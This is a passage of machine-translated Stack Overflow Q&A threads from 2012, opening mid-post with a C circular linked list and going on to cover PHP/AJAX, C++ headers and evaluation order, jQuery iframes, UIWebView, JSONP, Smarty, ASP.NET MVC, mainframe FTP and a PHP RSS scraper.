// delete a node referenced by the node pointer parameter.
//  this *can* be the root pointer, which means the root
//  must be set to the next item in the list before return.
int list_remove(list_t** headpp, list_t* node)
{
    // no list, empty list, or no node all return immediately.
    if (!(headpp && *headpp && node))
        return 1;

    // validate the node is in *this* list. it may seem odd, but
    //  we cannot just free it if the node may be in a *different*
    //  list, as it could be the other list's head-ptr.
    if (*headpp != node)
    {
        list_t *p = (*headpp)->next;
        while (p != node && p != *headpp)
            p = p->next;
        if (p == *headpp)
            return 1;
    }

    // isolate the node pointer by connecting surrounding links.
    node->next->prev = node->prev;
    node->prev->next = node->next;

    // move the head pointer if it is the same node
    if (*headpp ==  node)
        *headpp = (node != node->next) ? node->next : NULL;

    // finally we can delete the node.
    free(node->value);
    free(node);
    return 0;
}

// release the entire list. the list pointer will be reset to
//  NULL when this is finished.
void list_free(list_t **headpp)
{
    if (!(headpp && *headpp))
        return;
    while (*headpp)
        list_remove(headpp, *headpp);
}

// enumerate the list starting at the given node.
void list_foreach(list_t *listp, void (*function)(const char*))
{
    if (listp)
    {
        list_t *cur = listp;
        do {
            function(cur->value);
            cur = cur->next;
        } while (cur != listp);
    }
    printf("\n");
}

// printer callback
void print_str(const char* value)
{
    printf("%s\n", value);
}

// main entrypoint
int main(int argc, char *argv[])
{
    list_t *listp;
    list_init(&listp);

    // insert some new entries
    list_t* hello =   list_append(&listp, "Hello, Bedrock!!");
    assert(NULL != hello);
    assert(listp == hello);

    // insert Fred prior to hello. does not change the list head.
    list_t* fred = list_insert_before(hello, "Fred Flintstone");
    assert(NULL != fred);
    assert(listp == hello);
    // Hello, Bedrock!!
    // Fred Flintstone
    list_foreach(listp, print_str);

    // insert Wilma priot to Fred. does not change the list head.
    list_t* wilma = list_insert_before(fred, "Wilma Flintstone");
    assert(NULL != wilma);
    assert(list_next(wilma) == fred);
    assert(list_previous(wilma) == hello);
    // Hello, Bedrock!!
    // Wilma Flintstone
    // Fred Flintstone
    list_foreach(listp, print_str);

    list_t* barney =  list_prepend(&listp, "Barney Rubble");
    list_t* dino =    list_insert_after(wilma, "Dino");
    assert(barney != NULL);
    assert(dino != NULL);
    assert(listp == barney);
    assert(list_previous(barney) == fred);
    assert(list_next(barney) == hello);
    // Barney Rubble
    // Hello, Bedrock!!
    // Wilma Flintstone
    // Dino
    // Fred Flintstone
    list_foreach(listp, print_str);

    // remove everyone, one at a time.
    list_remove(&listp, fred);   // will not relocate the list head.
    // Barney Rubble
    // Hello, Bedrock!!
    // Wilma Flintstone
    // Dino
    list_foreach(listp, print_str);

    list_remove(&listp, hello);  // will not relocate the list head.
    // Barney Rubble
    // Wilma Flintstone
    // Dino
    list_foreach(listp, print_str);

    list_remove(&listp, barney); // will relocate the list head.
    // Wilma Flintstone
    // Dino
    list_foreach(listp, print_str);
    assert(listp == wilma);
    assert(list_next(wilma) == dino);
    assert(list_previous(listp) == dino);

    list_remove(&listp, wilma);  // will relocate the list head.
    // Dino
    list_foreach(listp, print_str);

    list_remove(&listp, dino);   // will relocate the list head;

    // generate a raft entries (a million of them)/
    char number[32];
    int i=0;
    for (;i<1000000; i++)
    {
        sprintf(number, "%d", i);
        list_append(&listp, number);
    }

    // now test freeing the entire list.
    list_free(&listp);

    return 0;
} 
```

断言和转储的散布是为了帮助验证算法的健全性。结果输出应该与代码中的注释相匹配，是：

```
Hello, Bedrock!!
Fred Flintstone

Hello, Bedrock!!
Wilma Flintstone
Fred Flintstone

Barney Rubble
Hello, Bedrock!!
Wilma Flintstone
Dino
Fred Flintstone

Barney Rubble
Hello, Bedrock!!
Wilma Flintstone
Dino

Barney Rubble
Wilma Flintstone
Dino

Wilma Flintstone
Dino

Dino 
```

最后的想法：我已经通过 valgrind 运行了这个，没有发现任何泄漏。*我很肯定*它不会满足您的需求。** 大部分会（其中一半已经*存在*）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-12T12:41:58.400

代码看起来没问题。

如何`list_t`定义？是否`list_t`有任何成员引用动态分配的内存？如果是这样，您可能还需要释放那些引用的内存。

# php - 使用 AJAX 更新 PHP 变量

> ID：13343782
> 
> 赞同：1
> 
> 时间：2012-11-12T12:34:05.913
> 
> 标签：php, ajax

我有一个结果页面，显示调查答案的图表。这些图表是通过执行 SQL 的 PHP 文件生成的。结果页面需要包含一些过滤，因此我尝试使用 AJAX 更新 SQL 以显示而不重新加载所述结果页面。

通过表格选择过滤器的类型；

```
<form name="sqlselector" action= "javascript" onsubmit"ajaxFunction('barscompleteCCC.php?     course=' + document.getElementById('course').value);">

<select name="course"> 
<option value="All">All</option>
<?php $result= mysql_query('SELECT * FROM tCourse'); ?> 
<?php while($row= mysql_fetch_assoc($result)) 
{ ?> 
    <option value="<?php echo htmlspecialchars($row['CourseID']);?>"> 
        <?php echo htmlspecialchars($row['CourseName']); ?> 
    </option> 
<?php 
} 
?> 
</select>
<input type="submit" value="Build">
</form> 
```

阿贾克斯是：

```
ajaxConnection.onreadystatechange = ajaxReply; // whenever the ready state is changed
ajaxConnection.open('GET', url, true); // opens a request to server
ajaxConnection.send(null); // closes the request
// Now, the code waits unless the ready state changes.
// After every change ajaxReply() is executed

    return true;

} // end function ajaxFunction

function ajaxReply() { // your code's logic goes here
    if (ajaxConnection.readyState == 4) 
    { // 4 mean page loaded successfully
        if (ajaxConnection.status == 200) 
        { // 200 mean all is OK
            document.getElementById('course').innerHTML =   ajaxConnection.responseText;            
        } // end if
        else 
        { // if the status code is anything else (a rare case though)
            alert('Something weird occurred. HTTP error code ' + ajaxConnection.status.toString() + 'yoko.');
            return; // exit
        }
    } // end if 
```

我想动态更改的变量位于 PHP 文件中：

```
session_start();
$course = $_GET['course']; 
```

请，任何帮助将不胜感激。:-)

# c++ - C++ 包含文件

> ID：13343791
> 
> 赞同：1
> 
> 时间：2012-11-12T12:35:00.220
> 
> 标签：c++, include

我知道在头文件中提供定义允许其他文件引用它们，然后链接器将所有目标文件添加在一起并稍后提供定义。

这只是为了让我们可以在其他库的其他地方重用实现吗？

如果我们不使用头文件或滥用头文件并将所有代码放入其中，即完整的实现会发生什么？编译每个文件是否需要更长的时间，因为需要在对等文件的基础上编译完整的定义？是否会导致链接器出现问题，因为这将是同一实现的多个编译版本？

这如何与模板一起使用？

布莱尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:40:27.287

每次新的编译目标包含该头文件时，都会编译放置在头文件中的任何代码，因此至少是的，您将需要更长的时间来编译。不过，这通常不是重大问题。

假设你有这个标题：

```
int f_header() {
    return 0;
} 
```

还有这些源文件：

```
/* a.cpp */
#include "myheader.h"
int f_a() {
    return f_header();
}

/* b.cpp */
#include "myheader.h"
int f_b() {
    return f_header();
} 
```

现在，当您编译每个源代码时，编译将成功。但是，当您链接程序时，链接器将失败，因为您将提供该函数`f_header()`两次。

模板是一种特殊情况，因为它们实际上不是代码，而是为要根据不同类型生成的代码提供模板。尽管当多个源文件以相同类型使用它们时会出现重复，但编译器能够为您处理这种特殊情况。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:39:19.520

拆分源文件和头文件中的代码（是？）在历史上或多或少是需要的。它允许编译器单独编译大型项目的代码单元，而整个项目太大而无法一次编译。

并且它允许缓存未更改的编译单元，从而进一步缩短了编译时间。

所以从技术上讲，编译器会看到一整套不同的编译单元。如果您提供相同定义的多个实现，编译器将无法告诉您。但是一旦链接器将已编译的单元打包到一个可执行文件中，它就会绊倒它。

今天，像 C# 或 Java 这样的“现代”语言已经摆脱了这种历史限制。但是 C++ 是一门复杂的语言，即使对于编译器来说也是如此，所以这些优势在某种程度上仍然是相关的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-12T12:45:18.170

编译器一次编译一个文件。编译器正在解析的源文件可能包含其他文件，但所有这些包含的文件在预编译阶段都“扁平化”为单一源，编译器“看到”一个单一的代码实体。

由于上述原因，代码是在 .cpp 文件中还是在 .h 文件中对编译器来说并不重要，因为编译器不会做出这种区分。但是，如果某些函数定义或某些变量定义在 .h 文件中，则问题会出现在链接阶段。

链接器看不到源文件，但可以看到目标文件 (.obj)，这是编译器生成的结果。链接器知道每个目标文件中的每个函数和每个变量，链接器的工作是将它们全部绑定（或链接）到一个可执行文件中。如果在不同的目标文件中存在多个同名的变量或函数，链接器将不知道如何处理它们，并且会报错。可以通过选项强制链接器忽略所有额外的变量和函数，但不要轻易使用该选项。同名的两个函数实际上可能完全不同，忽略其中一个会导致各种错误。

另一方面，模板根本不是函数。它们是实际功能的蓝图。当编译器遇到模板时，不会发生任何实质性的事情。只有当模板被实例化为实际函数时，编译器才会生成这样的函数。因为这个模板可以驻留在头文件中就好了。

# jquery - iFrame 和鼠标交互

> ID：13343792
> 
> 赞同：0
> 
> 时间：2012-11-12T12:35:00.840
> 
> 标签：jquery, iframe, mouseup

当使用任何类型的 jQuery UI 控件（即：jQuery 滑块控件）时，如果在传递 iFrame 时释放 mouseup，该控件将保持活动状态。活跃，我的意思是就像你从来没有鼠标一样。

我正在构建一个在 1 个区域使用 iFrame 的应用程序，因此这已成为一个大问题。有没有办法解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:47:05.263

您是否尝试过 iframeFix 助手？它在 iframe 上放置一个透明屏幕。我已经将它与可拖动/可放置的 UI 一起使用。不确定滑块控件。

[http://api.jqueryui.com/draggable/#option-iframeFix](http://api.jqueryui.com/draggable/#option-iframeFix)

如果这不起作用（无法看到代码），我的猜测是问题出在与 iframe 的交互上。当您将鼠标悬停在 iframe 上时，它会与父 DOM 中的事件处理程序混淆，就像将鼠标移出浏览器窗口本身一样。

您是否尝试将自己的透明层放在 iframe 上？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-26T09:02:38.323

我选择了一个基本的计时器解决方案，我尝试了其他方法，但它似乎使滑块变得迟缓

```
// fix for jq-ui slider not releasing outside of iframe
$(document).on('mouseout', 'body', function(){
        outOfFrame = true;
});

$(document).on('mouseover', 'body', function(){
        outOfFrame = false;
});

setInterval(function(){

    if(outOfFrame) {
         $('#wrap').trigger('mousedown').trigger('mouseup');
    }

}, 1500); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-03-04T11:59:57.887

这个线程很旧，但我最近自己也遇到了这个问题，这就是解决我在 Internet Explorer 上 iframe 中的 jquery ui 滑块问题的原因。

```
$("#wrapper").mouseleave(function (){
   $('#wrapper').trigger('mousedown').trigger('mouseup');
}) 
```

# android - JSoup 不工作

> ID：13343793
> 
> 赞同：0
> 
> 时间：2012-11-12T12:35:12.903
> 
> 标签：android

我正在尝试使用 JSoup 从字符串中删除 html 标记，但在运行时模拟器给出了一个异常：NoClassDefFoundError: org.jsoup.JSoup

这是我的代码：

```
String result="<html> hello </html>";
Jsoup.parse(result).text(); 
```

谁能帮我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:58:53.033

与其将 JSoup jar 放在 lib 中，不如将其放在 libs 中。

试试[link1](https://stackoverflow.com/questions/9934744/android-java-lang-noclassdeffounderror-org-jsoup-jsoup)和[link2](https://stackoverflow.com/questions/2247998/noclassdeffounderror-eclipse-and-android/9916751#9916751) ..,。

# iphone - 在 UIWebview 中加载字符串

> ID：13343794
> 
> 赞同：20
> 
> 时间：2012-11-12T12:35:17.690
> 
> 标签：iphone, ios, uiwebview

如何在 UIWebview 中加载如下所示的字符串

```
"\n
\nEgestas rhoncus auctor ac. Risus parturient, mid ultrices nisi.\U00a0
\nAugue ac elementum duis aliquet dolor elementum cum?\U00a0
\nTristique, augue sit lorem adipiscing dis!\U00a0
\nNunc nunc ultricies pellentesque dis dictumst enim
\n
\n" 
```

我正在尝试在 5 个 webviews 中加载相同的内容..但它对我来说崩溃了..

* * *

## 回答 #1

> 赞同：73
> 
> 时间：2012-11-12T12:39:56.787

你应该使用：

```
[webView loadHTMLString:string baseURL:nil]; 
```

但请注意，您不会保留换行符。要保留换行符，您需要将 \n 替换为 <\br> （或任何有效的换行html），所以这变成：

```
[webView loadHTMLString:[string stringByReplacingOccurrencesOfString:@"\n" withString:@"<br/>"] baseURL:nil]; 
```

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-11-12T12:38:20.270

这很简单，如下所示，

```
 [self.webView loadHTMLString:htmlString baseURL:nil]; 
```

您可以指定`baseURL`以使相对路径正常工作。这是你要找的吗？或更一般的解释`UIWebView ?`

* * *

## 回答 #3

> 赞同：8
> 
> 时间：2012-11-12T12:40:15.633

这是代码

```
 NSString* htmlString= @"hereyourSTring";
 [webView loadHTMLString:htmlString baseURL:nil]; 
```

这将在 WEBview 中加载字符串。

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2017-06-09T13:37:34.190

> 在斯威夫特 3

```
let webView = UIWebView()
webView.loadHTMLString("htmlString", baseURL: nil) 
```

但请注意，您不会保留换行符。要保留换行符，您需要将 \n 替换为 <\br> ，如上述答案中@MANIAK_dobrii 所做的那样

# javascript - 使用 JSON 的跨域请求

> ID：13343795
> 
> 赞同：5
> 
> 时间：2012-11-12T12:35:20.060
> 
> 标签：javascript, ajax, html, asp.net-web-api, jsonp

> **可能重复：**
> [Ajax 跨域调用](https://stackoverflow.com/questions/2558977/ajax-cross-domain-call)

我的应用程序正在使用**ASP .Net Web API 4.5 RTM** ，它与不同域上的**HTML5 和 AJAX**进行交互。

此应用程序是否需要使用**JSONP**而不是**JSON**进行序列化/反序列化？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T13:27:50.753

JSONP 或者`JSON with padding`是对基本 JSON 数据格式的补充。它提供了一种从不同域中的服务器请求数据的方法，由于相同的来源策略，典型的 Web 浏览器禁止这样做。

在同源策略下，从 server1.example.com 提供的网页无法正常连接到 server1.example.com 以外的服务器或与之通信。

HTML 元素是一个例外。利用元素的开放策略，一些页面使用它们来检索 JavaScript 代码，该代码对来自其他来源的动态生成的 JSON 格式数据进行操作。这种使用模式称为 JSONP。

JSONP 请求检索的不是 JSON，而是任意 JavaScript 代码。它们由 JavaScript 解释器评估，而不是由 JSON 解析器解析。

要了解此模式的工作原理，首先考虑一个返回 JSON 数据的 URL 请求。例如， JavaScript 程序可能会通过 请求此 URL `XMLHttpRequest`。假设 Foo 的 UserId 是 1234。请求 URLhttp://server2.example.com/Users/1234 的浏览器，传递 Foo 的 Id，会收到如下信息：

```
{"Name": "Foo", "Id": 1234, "Rank": 7} 
```

这个 JSON 数据可以根据 URL 中传递的查询参数动态生成。这里，一个 HTML 元素为其 src 属性指定一个返回 JSON 的 URL：

```
<script type="text/javascript"
    src="http://server2.example.com/Users/1234">
</script> 
```

浏览器将按顺序下载脚本文件，评估其内容，将原始 JSON 数据解释为块，并引发语法错误。即使数据被解释为 JavaScript 对象字面量，它也不能被在浏览器中运行的 JavaScript 访问，因为没有变量赋值对象字面量是无法访问的。

在 JSONP 使用模式中，由 src 属性指向的 URL 请求返​​回 JSON 数据，并在其周围包裹一个函数调用。这样，已经在 J​​avaScript 环境中定义的函数可以操作 JSON 数据。JSONP 有效负载可能如下所示：

```
functionCall({"Name": "Foo", "Id": 1234, "Rank": 7}); 
```

函数调用是 JSONP 的“P”——纯 JSON 周围的“填充”，或者根据 some[1] 的“前缀”。按照惯例，浏览器在对服务器的请求中提供回调函数的名称作为命名查询参数，通常使用名称 JSONP 或回调，例如，

```
<script type="text/javascript"
     src="http://server2.example.com/Users/1234?jsonp=parseResponse">
</script> 
```

在此示例中，接收到的有效负载将是：

```
parseResponse({"Name": "Foo", "Id": 1234, "Rank": 7}); 
```

# css - 如何使用 ShowDown.js 进行自定义降价渲染？

> ID：13343798
> 
> 赞同：2
> 
> 时间：2012-11-12T12:35:24.803
> 
> 标签：css, markdown, javascript, showdown

[感谢我在 StackOverflow 上的好朋友，我对这个问题](https://stackoverflow.com/q/13301935/2044)有一个很好的答案。

所以我有一个很好的预览工作——ShowDown.js 是我最终使用的降价解析器。

所以我现在的问题是：你们都知道无论如何要让 ShowDown 使用 CSS 来呈现我的规范吗？

例如，ShowDown 渲染标记为“等宽”的文本的方式非常小，我希望能够手动调整等宽标签的大小。

如果我不能，是否有任何其他我可以尝试的渲染引擎允许您自定义渲染输出？

谢谢。

# c# - 为什么 IIS 上的会话快速下降？

> ID：13343799
> 
> 赞同：0
> 
> 时间：2012-11-12T12:35:26.737
> 
> 标签：c#, asp.net, iis-7, asp-classic

我的项目在 IIS7 上运行。我有一个会话状态问题：会话迅速下降（一分钟或更短）。当我在 Visual Studio 2010（我的计算机上的本地 IIS）上运行项目时，我的会话没有问题。如何在 IIS 服务器上解决此问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:38:27.903

我的猜测是您有 InProc 会话状态，并且您的工作进程由于未处理的线程或任务异常或由于堆栈溢出而致命地崩溃。

切换到 StateServer 模式和/或修复现金。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:49:01.043

它可能是应用程序中未处理的异常，但也可能是服务器的时钟设置为与您的时间不同的时间。这意味着会话 cookie 会立即（或至少非常快）过期，因此您会丢失会话。

# php - 尝试使用 SmartyViewRenderer 在 Yii 中模板化视图文件

> ID：13343800
> 
> 赞同：2
> 
> 时间：2012-11-12T12:35:30.823
> 
> 标签：php, yii, smarty

我正在尝试在 Yii 中使用 SmartyViewRendere。我根据使用 Smarty 和 Yii 的说明完成了所有设置。

在我的应用程序中，我想呈现一个名为 widgets_sidebar_template.tpl 的模板

```
<h1>Widgets bewerken voor Sidebar #<?php echo $model->id; ?></h1>
<?php $this->render('widgets_sidebar_template', array(
        'available_widgets'=>$available_widgets
    )
) ?> 
```

这工作正常。

然后是 widgets_sidebar_template.tpl 文件：

```
$smarty->assign('availables', $available_widgets);
?>
<article id="widgets_container">
    <ul id="available_widgets" class="connect">
    <span>Beschikbaar</span><br><br>
    {foreach from=$availables key=k item=available}
        <li>{$available}</li>
    {/foreach}
    </ul>

    <ul id="active_widgets" class="connect">
        <span>Actief</span><br><br>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
        <li></li>
    </ul>
</article> 
```

该文件给出了错误

```
Undefined index: availables 
```

所以我想到的第一件事是我需要确保 $available_widgets 是一个数组。所以我想通了，我 100% 确定它是一个包含数据的数组。然后我检查了 $available_widgets 是否实际分配给'availables'（$availables），所以我删除了：

```
$smarty->assign.. 
```

这给了我同样的错误，所以我的猜测是我在分配“可用”smarty 数组时做错了。

我希望你们中的一个人可以根据这个intel给我更多的建议。谢谢：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T16:58:44.650

您不能`$smarty->assign`在 smarty 模板中使用。此外，PHP 标记在 Smarty 模板中也不起作用。我猜你说的是这个 SmartyRenderer：[https ://github.com/yiiext/smarty-renderer](https://github.com/yiiext/smarty-renderer)

最新版本需要 Smarty 版本 3 或更高版本，它可能不适用于 Smarty 2。

对于您的模板，您可以使用以下语法在 Smarty 中分配变量值：

```
{$availables=$available_widgets} 
```

在您的示例中，您甚至可以只`$available_widgets`在 foreach 循环中使用。

# c++ - 这是未指定（未定义）的行为吗？

> ID：13343806
> 
> 赞同：5
> 
> 时间：2012-11-12T12:36:04.363
> 
> 标签：c++

我读过这篇文章：[未定义的行为和序列点](https://stackoverflow.com/questions/4176328/undefined-behavior-and-sequence-points)，但我不知道它是否是 UB。

考虑以下示例：

```
#include <iostream>
class op {
public:
  explicit op(int x) {
    std::cout << "x:   " << x << std::endl;
  }

  op & operator + (const op & /* other */) {
    return *this;
  }
};

int main(int /* argc */, char * /* argv */ []) {
  int x = 0;
  op o = op(x++) + op(x++) + op(x++);

  std::cout << "res: " << x << std::endl;

  return 0;
} 
```

我期望这样的输出（或基于评估顺序的一些输出排列）：

```
x:   0
x:   1
x:   2
res: 3 
```

gcc-4.7.1 和 clang-3.0 给了我这样的输出，但是当我用 msvc-2010 编译这个例子时，我得到了输出：

```
x:   0
x:   0
x:   0
res: 3 
```

你能给我一些关于这种行为的信息吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-11-12T12:41:54.713

参数评估的顺序`a + b + c`是特定于编译器的。因此，调用的顺序`x++`将是特定于编译器的，并且对其进行中继将是未定义的行为。

在这样的表达方式中使用`x++`或`++x`通常是编码标准不佳的标志。最好避免它并简化您的表达方式。

在这个问题[Compilers and argument order of evaluation in C++ 中](https://stackoverflow.com/q/621542/1065190)，您可以找到关于 C++ 中参数评估顺序的讨论。

以下是 C++ 评估顺序的解释以及对 C++ 标准的引用： http: [//en.cppreference.com/w/cpp/language/eval_order](http://en.cppreference.com/w/cpp/language/eval_order)

**PS** Bjarne Stroustrup 在“C++ 编程语言”第 3 版第 6.2.2 节中明确说明了这一点。他还给出了一个理由：

> 在没有表达式求值顺序限制的情况下可以生成更好的代码。

（来自[https://stackoverflow.com/a/2934909/1065190](https://stackoverflow.com/a/2934909/1065190)）

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-11-12T12:38:00.253

这是未定义的行为，因为 . 的后增量之间没有序列点`x`。你不知道哪个`+`会先评估，你不知道哪个`op(x++)`会先被构造，你不知道`x++`会以什么顺序执行。它是未定义的，只是不要写那样的代码。

# asp.net-mvc-3 - 如何访问 ViewModel 中的方法？

> ID：13343808
> 
> 赞同：1
> 
> 时间：2012-11-12T12:36:10.467
> 
> 标签：asp.net-mvc-3

我有一个视图模型：

```
public class ManageUserViewModel
{
  public Entities.User User { get; set; }
  public bool IsLockedOut { get; set; }
  public bool IsActivated { get; set; }
  public bool IsArchived { get; set; }
} 
```

在 Entity.User User 我有一个方法：

```
/// Gets the incentive programs that this user is participating in.
public IEnumerable<IncentiveProgram> GetParticipatingIncentivePrograms()
{
  return Node.ParticipatingIncentivePrograms
    .Where(x => x.PublishingState == PublishingState.Live
      && DateTime.UtcNow.Date >= x.DateStart && DateTime.UtcNow.Date <= x.DateEnd);
} 
```

然后我有我的控制器：

```
 [HttpGet]
public ActionResult UserDetails(int id)
{
  var user = ZincService.GetUserForId(id);
  if (user == null || user.Customer.CustomerId != CurrentCustomer.CustomerId)
    return DataNotFound();

  ManageUserViewModel viewModel = new ManageUserViewModel();
  viewModel.User = user;
  viewModel.IsLockedOut = MembershipService.IsUserLocked(user.Email);
  viewModel.IsActivated = user.DateTimeActivated.HasValue && MembershipService.IsUserApproved(user.Email);
  viewModel.IsArchived = user.IsArchived;
  viewModel.User.GetParticipatingIncentivePrograms();
  return View(viewModel);
} 
```

如何在我的视图中获得 GetParticipatingIncentivePrograms 的输出？我的视图中还没有代码。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:39:07.200

恕我直言，您最好在视图模型中表示您的激励计划。事实上有一个 userViewModel 然后可能有一个程序列表。然后将它们加载到您的控制器中

```
ManageUserViewModel{
   public UserViewModel User { get; set; }
}

UserViewModel {
   public List<string> ParticipatingIncentivePrograms { get; set; }
} 
```

通常最好不要将整个域图加载到视图中，因为您可能会遇到几个问题（N+1 db 调用、访问关闭的代理等）。我已将您的程序键入为一个简单的名称列表，但您可以将其扩展为字典或查找。再次保持视图模型尽可能轻巧和简单。

更新：

由于您无法更改视图模型，因此看起来您必须设置该值，您目前只是在调用。所以尝试以下

```
 viewModel.User.ParticipatingIncentivePrograms = 
        viewModel.User.GetParticipatingIncentivePrograms(); 
```

如果用户上有这样的集合，或者将它们设置为您的视图模型上的其他内容。

# ftp - java ftp代码中的大型机文件命名

> ID：13343814
> 
> 赞同：0
> 
> 时间：2012-11-12T12:36:39.120
> 
> 标签：ftp, filepath, mainframe

假设我的大型机主机 xxx.xxx.xxx.xx 在路径 TEST 中由用户 QWERTY 创建的文件 file.txt。我想将此文件从大型机 ftp 到我的 unix 机器。当我运行代码时`fsDataInputStream=ftpFileSystem.open(new Path ("ftp://QWERTY@xxx.xxx.xxx.xx'TEST/file.txt'") );`

我得到的错误是“路径[ftp://QWERTY@xxx.xxx.xxx.xx](ftp://QWERTY@xxx.xxx.xxx.xx) 'TEST/file.txt' 是一个目录。”

关于给予`fsDataInputStream = ftpFileSystem.open(new Path('TEST/file.txt'), 1000);`

我收到错误：文件 'QWERTY.'/'TEST/file.txt 不存在。它会自行附加“QWERTY.”/。

关于如何给出这个文件路径名的任何指针？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-20T07:36:31.003

我得到它的工作！问题是我使用的是 fTpFileSystem ，它自己将用户名附加到连接 URL 。我改为使用 FTP 系统的其他 api。

# php - PHP 网络应用程序瘫痪了整个网站

> ID：13343816
> 
> 赞同：0
> 
> 时间：2012-11-12T12:36:49.477
> 
> 标签：php, sleep, execution

我有一个网络应用程序，它可以获取各种来源的内容，以测试该文本中是否存在某个关键字。

问题是当该程序运行时，整个网站变得无响应。

我试过添加 sleep(1); 到处都是休息时间，但唯一能做的就是延长执行时间，从而使我的网站在更长的时间内保持无响应。

是否有另一种解决方案可以防止一个程序停止整个网站或影响整个网站？

这是代码示例（请不要介意使用mysql而不是mysqli...该网站按原样交给我，目前将网站改造成mysqli的工作量太大）

```
function updatethestuff()
        {
        $count = 0;
        error_reporting(E_ALL);
        ini_set('display_errors', '1');
        $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt','Begin met het verwerken van alle rssfeeds'."\n",'w');
        $feeds = $this->db->query("SELECT * FROM rsscanner.feeds where `url` not like 'disabled' order by `id` asc");
        foreach($feeds->result() as $feed)
            {

            if(!isset($this->rssparser))
                {
                $this->load->library('RSSParser', array('url' => $feed->url, 'life' => 2));
                }
            else
                {
                $this->rssparser->reinit(array('url' => $feed->url, 'life' => 2));
                }
            $this->write_file(FCPATH.'/pagemodules/rssfeedlog.txt','Begin met parsen van resultaten van ' . $feed->naam . "\n");
            $data = $this->rssparser->getFeed(20);
            foreach ($data as $item) 
                {
                $innerHTML='';
                $link = mysql_real_escape_string($item['link']);
                $query = $this->db->query("SELECT feed_id from rsscanner.rsscontent where url='$link' limit 0,1");
                $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': Aantal keren dat ' . $link . ' al voorkomt is ' . $query->num_rows() . "\n");
                sleep(1);
                if($query->num_rows() == 0)
                    {                   
                    $dom = new DOMDocument();
                    $dom->validateOnParse = false;
                    $html = get_data($item['link']);
                    $dom->loadHTML($html);
                    $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': HTML data geladen' . "\n");
                    sleep(1);
                    if(isset($feed->contentdiv))
                        {
                        $x = $dom->getElementById($feed->contentdiv);
                        $tmp_dom = new DOMDocument(); 
                        $tmp_dom->appendChild($tmp_dom->importNode($x, true)); 
                        $innerHTML.=trim($tmp_dom->saveHTML()); 
                        $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': Informatie uit de contentdiv("' . $feed->contentdiv . '") geladen'. "\n");
                        sleep(1);
                        }
                    else
                        {
                        $finder = new DomXPath($dom);
                        $nodes = $finder->query("//*[contains(concat(' ', normalize-space(@class), ' '), ' {$feed->containerclass} ')]");
                        $tmp_dom = new DOMDocument(); 
                         foreach ($nodes as $node) 
                            {
                            $tmp_dom->appendChild($tmp_dom->importNode($node,true));
                            }
                        $innerHTML.=trim($tmp_dom->saveHTML()); 
                        $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': Informatie uit de content class("' . $feed->containerclass . '") geladen' . "\n");
                        sleep(1);
                        }
                    unset($dom);
                    unset($tmp_dom);
                    $innerHTML = mysql_real_escape_string(stripslashes($innerHTML));
                    $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': html veilig gemaakt voor database'. "\n");
                    sleep(1);
                    $q=$this->db->query("SELECT * FROM `rsscanner`.`zoekwoorden` union select * from `rsscanner`.`zoekwoord_synoniem`");

                    $found = false;
                    $keywordsstring = "";
                    $lowerhtml = strtolower($innerHTML);
                    $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': Begin met zoekwoord vergelijking'. "\n");
                    sleep(1);
                    foreach($q->result() as $r)
                        {
                        if(strpos($lowerhtml,strtolower($r->zoekwoord)) !== false)
                            {
                            $found = true;
                            $keywordsstring = "$keywordsstring ".$r->zoekwoord;
                            $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': - Match met zoekwoord: ' . $r->zoekwoord . "\n");
                            sleep(1);
                            }

                        }
                    if($found)
                        {

                        $keywordsstring = mysql_real_escape_string($keywordsstring);
                        $title = mysql_real_escape_string($item['title']);
                        $desc = mysql_real_escape_string(strip_tags($item['description']));
                        $date = mysql_real_escape_string(date('Y-m-d',strtotime($item['pubDate'])));
                        $this->db->query("INSERT INTO rsscanner.rsscontent (feed_id,title,description,published,url,content,keywords_found) 
                                                                    VALUES ('{$feed->id}','$title','$desc','$date','$link','$innerHTML','$keywordsstring')");
                        $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': Opslaan in database als geldig zoekresultaat' . "\n");

                        }
                    else
                        {

                        $keywordsstring = mysql_real_escape_string($keywordsstring);
                        $title = mysql_real_escape_string($item['title']);
                        $desc = mysql_real_escape_string(strip_tags($item['description']));
                        $date = mysql_real_escape_string(date('Y-m-d',strtotime($item['pubDate'])));
                        $this->db->query("INSERT INTO rsscanner.rsscontent (feed_id,title,description,published,url,content,keywords_found) 
                                                                    VALUES ('{$feed->id}','$title','$desc','1983-05-10 09:10:53','$link','$innerHTML','NO MATCH')");
                        $this->write_file(FCPATH . '/pagemodules/rssfeedlog.txt',$feed->naam . ': markeren in database als een no match' . "\n");
                        }
                    sleep(1);
                    }
                }
            }
        echo "done";
        } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T14:31:03.557

是否可以选择将此任务作为后台进程？

例如使用 Gearman

